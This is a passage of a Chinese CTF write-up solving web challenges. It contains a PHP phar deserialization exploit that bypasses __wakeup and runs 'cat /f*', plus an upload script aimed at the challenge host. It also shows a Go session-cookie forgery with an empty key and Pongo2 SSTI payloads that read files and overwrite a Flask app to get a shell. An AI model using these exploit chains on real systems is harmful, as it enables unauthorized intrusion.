class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oi</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __set() method.</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">yyyou</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hhh&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yyyou</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;oi);  <span class="comment">//目标</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>发现php版本为7.0.8，可利用<strong>CVE-2016-7124</strong></p>
+<ul>
+<li>当反序列化字符串中，表示<strong>属性个数的值大于真实属性个数时</strong>，会绕过 __wakeup 函数的执行</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004114349452.png"
+                      alt="image-20251004114349452"
+                ></p>
+<p>本地打通</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004114459215.png"
+                      alt="image-20251004114459215"
+                ></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>生成phar</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">file</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">data</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oi</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">file</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;data = <span class="string">&quot;data://text/plain,Hellociscccn&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">file</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;ou = <span class="keyword">new</span> <span class="title function_ invoke__">data</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;ou-&gt;oi = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;exp.phar&#x27;</span>);   <span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exp.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>修改属性数量和修复签名绕过wakeup，并修改后缀名</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        f = file.read()</span><br><span class="line">    data = f[:-<span class="number">28</span>]  <span class="comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    data = data.replace(<span class="string">b&#x27;&quot;file&quot;:3:&#123;s:4:&quot;name&quot;;O:4&#x27;</span>, <span class="string">b&#x27;&quot;file&quot;:4:&#123;s:4:&quot;name&quot;;O:4&#x27;</span>)  <span class="comment"># 绕过__wakeup</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    final = f[-<span class="number">8</span>:]  <span class="comment"># 获取最后8位GBMB标识和签名类型</span></span><br><span class="line">    newfile = data + sha1(data).digest() + final  <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">r&#x27;exp2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile)  <span class="comment"># 写入到新的phar文件</span></span><br><span class="line"></span><br><span class="line">getPhar()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://env.xj.edisec.net:32024/file.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;exp2.jpg&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;exp2.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">response = requests.post(url1, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&quot;http://env.xj.edisec.net:32024/filechecker/index.php&quot;</span></span><br><span class="line">post_data = &#123;<span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=phar://./upload/8a7370ab45d47bd283dd70f15d333623.jpg&#x27;</span>&#125;</span><br><span class="line">response = requests.post(url2, data=post_data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004113649174.png"
+                      alt="image-20251004113649174"
+                ></p>
+<h1 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h1><p><strong>考点：go语言下的session伪造+Pongo2 SSTI+flask SSRF</strong></p>
+<p><strong>思路</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7</span><br><span class="line"></span><br><span class="line">猜测SESSION_KEY为空伪造admin的session -&gt; Pongo2 SSTI -&gt; 文件上传覆盖原来的flask sever.py 加入./shell路由</span><br><span class="line">-&gt; flask开启了debug热部署，修改源代码无需重启即可更新使用新代码的功能 -&gt; SSRF访问flask进而getshell</span><br></pre></td></tr></table></figure></div>
+
+<p>main.go</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>router.go</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>漏洞点主要在<code>/Admin</code>经过认证<code>session.Values[&quot;name&quot;] == &quot;admin&quot;</code>后可打<code>pongo2</code>模板的SSTI(WAF掉了XSS减少了攻击面)</p>
+<p><code>/Flask</code>可打SSRF通过<code>http.Get(&quot;http://127.0.0.1:5000/&quot; + name)</code>直接代理用户请求到内部Flask应用</p>
+<p>通过<code>/flask?name=</code>报错得到Flask源码，相当于内部Flask应用是没有SSTI的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004155400646.png"
+                      alt="image-20251004155400646"
+                ></p>
+<p>这里访问server.py是需要这样构造<code>/flask?name=/?name=123</code>才能将name传入flask</p>
+<p>但现在的flask其实没啥用，需要知道go环境中的SESSION_KEY</p>
+<p><strong>这里其实就是需要猜测了，可以试试将SESSION_KEY置空，也就是猜测服务器的环境变量里没有设置SESSION_KEY</strong>(有点让人无语的。。。)</p>
+<p>伪造admin的session脚本</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	store := sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">	req, _ := http.NewRequest(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	session, _ := store.Get(req, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 模拟响应写入器来获取Set-Cookie头</span></span><br><span class="line">	w := &amp;responseWriter&#123;header: <span class="built_in">make</span>(http.Header)&#125;</span><br><span class="line">	session.Save(req, w)</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Cookie:&quot;</span>, w.header.Get(<span class="string">&quot;Set-Cookie&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> responseWriter <span class="keyword">struct</span> &#123;</span><br><span class="line">	header http.Header</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *responseWriter)</span></span> Header() http.Header &#123;</span><br><span class="line">	<span class="keyword">return</span> w.header</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *responseWriter)</span></span> Write([]<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *responseWriter)</span></span> WriteHeader(<span class="type">int</span>) &#123;&#125;</span><br><span class="line">#MTc1OTU2NTgyOHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXzr8<span class="number">-0</span>LgVu-ldv_Zk5vAyPBXEeVrdmAEeDH97herPBQVg==</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004161747831.png"
+                      alt="image-20251004161747831"
+                ></p>
+<p>成功伪造</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004161857507.png"
+                      alt="image-20251004161857507"
+                ></p>
+<p>接下来就是SSTI了</p>
+<p>Pongo2 模板注入的利用方式：</p>
+<ol>
+<li>基本语法：<code>&#123;&#123; expression &#125;&#125;</code></li>
+<li>我们可以访问传递给模板的上下文变量。这里模板执行时传递了 <code>pongo2.Context&#123;&quot;c&quot;: c&#125;</code>，所以我们可以访问变量 <code>c</code>，它是一个 <code>*gin.Context</code> 对象。</li>
+</ol>
+<p>但是项目里是没办法直接RCE的</p>
+<p>可参考<a class="link"   target="_blank" rel="noopener" href="https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7" >https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>关键的两函数，需要绕过引号</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取指定名称的上传文件</span><br><span class="line">func (c *Context) FormFile(name string) (*multipart.FileHeader, error)</span><br><span class="line"></span><br><span class="line"># 保存上传的文件到特定目录</span><br><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure></div>
+
+<p>这里我们用FormFile上传server.py覆盖原来的，由于开启debug的原因可以直接访问新的server.py</p>
+<p>成功上传</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004171232041.png"
+                      alt="image-20251004171232041"
+                ></p>
+<p>getshell，这里有个坑就是 <code>/</code>需要双URL编码，因为goweb解码一次，flask再解码一次，否则会报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004174835290.png"
+                      alt="image-20251004174835290"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004175111920.png"
+                      alt="image-20251004175111920"
+                ></p>
+<p>原题的flag名很复杂，所以只能getshell</p>
+<p>复现的这个环境是可以文件包含的</p>
+<h3 id="c-gin-Context的使用"><a href="#c-gin-Context的使用" class="headerlink" title="c *gin.Context的使用"></a><code>c *gin.Context</code>的使用</h3><p><a class="link"   target="_blank" rel="noopener" href="https://pkg.go.dev/github.com/gin-gonic/gin#pkg-index" >https://pkg.go.dev/github.com/gin-gonic/gin#pkg-index <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>文件读取payload</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%25include c.Request.Referer()%25&#125; #通过请求头的Referer</span><br><span class="line">&#123;%25include c.Request.Host()%25&#125; #通过请求头的Host</span><br><span class="line">&#123;%25include c.Query(c.ClientIP())%25&#125; #通过?ip\_add=/app/server.py读取</span><br><span class="line">&#123;%25include c.Request.UserAgent()%25&#125;</span><br><span class="line">&#123;%25include%20c.Request.Header.File[0]%25&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004180123656.png"
+                      alt="image-20251004180123656"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251004180157885.png"
+                      alt="image-20251004180157885"
+                ></p>
+<h1 id="awdjava"><a href="#awdjava" class="headerlink" title="awdjava"></a>awdjava</h1><p>附件给了war包，先部署</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">主要目录结构</span><br><span class="line"><span class="attribute">src</span>/</span><br><span class="line">├── <span class="selector-tag">main</span>/</span><br><span class="line">│   ├── java/com/mengda/awd/     # Java源代码</span><br><span class="line">│   │   ├── controller/         # 控制器层</span><br><span class="line">│   │   ├── <span class="attribute">filter</span>/            # 过滤器</span><br><span class="line">│   │   ├── Utils/             # 工具类</span><br><span class="line">│   │   └── AwdApplication<span class="selector-class">.java</span> # 主启动类</span><br><span class="line">│   ├── resources/             # 资源文件</span><br><span class="line">│   └── webapp/               # Web应用目录</span><br><span class="line">└── test/                     # 测试代码</span><br><span class="line"></span><br><span class="line">核心功能模块</span><br><span class="line"><span class="number">1</span>. 用户认证模块</span><br><span class="line">登录功能 (LoginController)</span><br><span class="line">随机字符串生成</span><br><span class="line">会话管理</span><br><span class="line">登出功能 (LogOutController)</span><br><span class="line">支持多种登出方式</span><br><span class="line">会话清理</span><br><span class="line"><span class="number">2</span>. 权限控制</span><br><span class="line">过滤器 (myFilter)</span><br><span class="line">处理所有请求</span><br><span class="line">实现基础的安全过滤</span><br><span class="line">会话工具 (SessionUtils)</span><br><span class="line">管理用户会话状态</span><br><span class="line">提供登出功能</span><br><span class="line"><span class="number">3</span>. 业务功能模块</span><br><span class="line">商品管理 (CommodityManagerController)</span><br><span class="line">商品CRUD操作</span><br><span class="line">数据展示</span><br><span class="line">页面导航 (IndexController)</span><br><span class="line">首页路由</span><br><span class="line">登录页面路由</span><br><span class="line"><span class="number">4</span>. 工具类</span><br><span class="line">文件操作 (File)</span><br><span class="line">文件读取功能</span><br><span class="line">安全检查 (Check)</span><br><span class="line">路径访问控制</span><br><span class="line">白名单机制</span><br></pre></td></tr></table></figure></div>
+
+<p>漏洞点主要在LogOutController类中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251005165623243.png"
+                      alt="image-20251005165623243"
+                ></p>
+<p>首先使用<code>Class.forName(targetclass)</code>动态加载指定的类，通过反射获取类的无参构造函数并创建实例，根据参数<code>method</code>动态调用类中的相应方法</p>
+<ul>
+<li>当<code>method</code>参数为”logout”时，调用目标类的<code>logout(HttpSession)</code>方法</li>
